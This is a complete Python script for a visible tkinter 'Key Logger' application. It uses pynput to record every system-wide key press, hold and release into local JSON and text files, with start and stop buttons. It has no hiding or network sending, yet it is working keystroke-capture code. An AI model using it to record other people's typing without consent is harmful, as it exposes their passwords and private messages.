import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import json
import threading


root = tk.Tk()
root.geometry("260x220")
root.title("Key Logger")
root.resizable(False, False)

status_text = tk.StringVar()
status_text.set("Status: Stopped")


key_list = []
x = False
listener = None
listener_thread = None
is_running = False


def update_json_file():
    with open('logs.json', 'w') as json_file:
        json.dump(key_list, json_file, indent=2)


def update_txt_file(text):
    with open('logs.txt', 'a') as txt_file:
        txt_file.write(text + "\n")


def on_press(key):
    global x

    key_str = str(key).replace("'", "")

    if not x:
        key_list.append({'Pressed': key_str})
        update_txt_file(f"Pressed: {key_str}")
        x = True
    else:
        key_list.append({'Held': key_str})
        update_txt_file(f"Held: {key_str}")

    update_json_file()


def on_release(key):
    global x

    key_str = str(key).replace("'", "")
    key_list.append({'Released': key_str})
    update_txt_file(f"Released: {key_str}")

    x = False
    update_json_file()


def start_logger():
    global listener, listener_thread, is_running

    if is_running:
        messagebox.showinfo("Info", "Key Logger is already running")
        return

    is_running = True
    status_text.set("Status: Running")
    update_txt_file("=== Key Logger Started ===")

    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )

    listener_thread = threading.Thread(target=listener.start)
    listener_thread.daemon = True
    listener_thread.start()


def stop_logger():
    global listener, is_running

    if not is_running:
        messagebox.showinfo("Info", "Key Logger is not running")
        return

    if listener:
        listener.stop()

    is_running = False
    status_text.set("Status: Stopped")
    update_txt_file("=== Key Logger Stopped ===")


title_label = tk.Label(root, text="Key Logger", font=("Arial", 16, "bold"))
title_label.pack(pady=10)

status_label = tk.Label(root, textvariable=status_text, font=("Arial", 10))
status_label.pack(pady=5)

start_btn = tk.Button(root, text="Start Logging", width=20, command=start_logger)
start_btn.pack(pady=5)

stop_btn = tk.Button(root, text="Stop Logging", width=20, command=stop_logger)
stop_btn.pack(pady=5)

exit_btn = tk.Button(root, text="Exit", width=20, command=root.destroy)
exit_btn.pack(pady=10)

root.mainloop()
